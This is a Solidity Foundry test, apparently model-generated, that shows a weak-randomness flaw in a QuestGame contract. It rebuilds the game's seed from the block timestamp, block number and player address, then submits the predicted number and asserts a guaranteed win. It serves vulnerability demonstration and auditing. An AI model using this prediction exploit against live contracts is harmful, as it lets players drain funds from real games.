// Generation Time: 83,08s
// Input Tokens: 2102
// Output Tokens: 340
// Reasoning Tokens: 3250


// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {QuestGame} from "../src/QuestGame.sol";

contract TestWeakRandomnessQuestGame is Test {

    QuestGame public questGame;

    function setUp() public {
        vm.deal(address(this), 100 ether);
        questGame = new QuestGame{value: 1 ether}();
    }

    function test_highlightPredictableRandomValue(uint256 blockTimestamp, uint256 blockNumber) public {
        
        blockTimestamp = bound(blockTimestamp, 3600, 2**256 - 1);
        blockNumber = bound(blockNumber, 0, 2**256 - 1);

        vm.deal(address(this), 10 ether);
        address player = address(this);
        vm.prank(player);

        vm.warp(blockTimestamp);
        vm.roll(blockNumber);

        uint256 predictedSeed = uint256(
            keccak256(
                abi.encodePacked(
                    blockTimestamp,
                    blockNumber,
                    player
                )
            )
        );
        uint256 predictedNumber = predictedSeed % 100;

        uint256 contractBalanceBefore = address(questGame).balance;
        uint256 playerBalanceBefore = player.balance;
        
        questGame.attemptQuest{value: 0.1 ether}(predictedNumber);
        
        (uint256 exp, uint256 wins) = questGame.getPlayerStats(player);
        
        assertEq(wins, 1);
    }
}
